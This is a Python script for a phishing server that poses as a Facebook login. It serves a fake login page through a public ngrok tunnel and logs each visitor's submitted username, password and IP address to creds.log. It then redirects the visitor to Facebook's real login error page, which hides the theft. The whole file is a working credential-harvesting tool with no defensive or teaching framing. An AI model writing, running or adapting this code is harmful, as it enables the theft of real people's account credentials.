import http.server
import socketserver
import urllib.parse
import logging
import os

# Add pyngrok import
from pyngrok import ngrok, conf
conf.get_default().auth_token = "token"

# Config
PORT = 5002  # Change to a free port
LOG_FILE = "creds.log"
HTML_FILE = "index.html"
CSS_FILE = "css/style.css"
SERVER_NAME = "nahid.com"

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            if os.path.exists(HTML_FILE):
                with open(HTML_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"Error: Login page not found")
        elif self.path == "/css/style.css":
            self.send_response(200)
            self.send_header("Content-type", "text/css")
            self.end_headers()
            if os.path.exists(CSS_FILE):
                with open(CSS_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"/* Error: CSS file not found */")
        elif self.path.startswith("/images/"):
            img_path = self.path.lstrip("/")
            if os.path.exists(img_path):
                # Set content-type for SVG or other images
                if img_path.endswith(".svg"):
                    self.send_response(200)
                    self.send_header("Content-type", "image/svg+xml")
                else:
                    self.send_response(200)
                    self.send_header("Content-type", "application/octet-stream")
                self.end_headers()
                with open(img_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"/* Error: Image not found */")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]

        log_msg = f"Phishing attempt: username={username}, password={password}, IP={self.client_address[0]}"
        logging.info(log_msg)
        print(log_msg)
        
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com/login/?error=invalid")
        self.end_headers()

    def log_message(self, format, *args):
        pass

# Start server
def run_server():
    httpd = socketserver.TCPServer(("", PORT), PhishHandler)
    proto = "HTTP"

    # Start ngrok tunnel
    public_url = ngrok.connect(PORT, "http")
    print(f"[+] ngrok URL: {public_url}")
    print(f"[+] Logs saved to {LOG_FILE}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Shutting down...")
    finally:
        httpd.server_close()
        ngrok.kill()
        print("[-] Server and ngrok tunnel closed.")

if __name__ == "__main__":
    if not os.path.exists(HTML_FILE):
        print(f"[-] Error: {HTML_FILE} not found—create it first!")
    else:
        run_server()